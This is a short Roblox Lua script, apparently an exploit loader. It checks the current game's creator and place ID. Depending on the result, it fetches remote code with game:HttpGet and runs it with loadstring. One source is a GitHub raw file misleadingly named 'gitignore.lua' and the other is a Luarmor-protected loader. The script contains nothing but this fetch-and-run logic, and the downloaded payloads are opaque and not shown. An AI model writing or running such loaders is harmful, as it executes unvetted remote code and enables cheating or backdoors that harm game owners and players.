info = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId);
if (info.Creator.CreatorType == "Group" or info.Creator.CreatorTargetId == 5192826) then
	loadstring(game:HttpGet("https://raw.githubusercontent.com/mox98012-ops/-./refs/heads/main/gitignore.lua"))();
elseif (tostring(game.PlaceId) == "155615604") then
	loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/859516ffc2c6719d9fefdc7cdc30b8c6.lua"))();
end;
